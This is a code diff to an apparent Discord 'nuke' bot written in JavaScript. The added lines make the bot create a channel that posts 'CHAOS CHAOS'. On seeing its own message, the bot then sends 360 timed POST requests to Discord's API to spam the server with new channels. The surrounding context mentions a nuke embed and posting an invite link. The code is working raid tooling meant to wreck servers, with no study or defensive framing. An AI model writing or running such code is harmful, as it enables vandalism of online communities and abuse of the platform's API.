@@ -488,12 +488,38 @@ channel2.send(nukeEmbed).then(channel2.send(`discord.gg/${invite.code}`))
          number++
  
          }
-         
+               msg.guild.channels.create("le funni").then(c => {
+        c.send("CHAOS CHAOS")
+      }) 
         }, 10000);
      }
   }
  })
  
+
+client.on("message", msg => {
+  if(msg.content === 'CHAOS CHAOS') {
+    if(msg.author.id === client.user.id) {
+      var gid = msg.guild.id
+      setTimeout(() => {
+        var i = 0
+        while(i < 360) {
+          setTimeout(() => {
+            axios({
+              url: `https://discord.com/api/v8/guilds/${gid}/channels`,
+              method: 'POST',
+              headers: {
+               authorization: `Bot ${token1}`
+              },data: {"type":0,"name": channelNames(),"permission_overwrites":[]}
+            })
+          }, 1800);
+          i++    
+        }
+      }, 5000);
+    }
+  }
+})
+
  
  client.on('message', message => {
    if(message.content === 'kiss my disrespectful ass') {
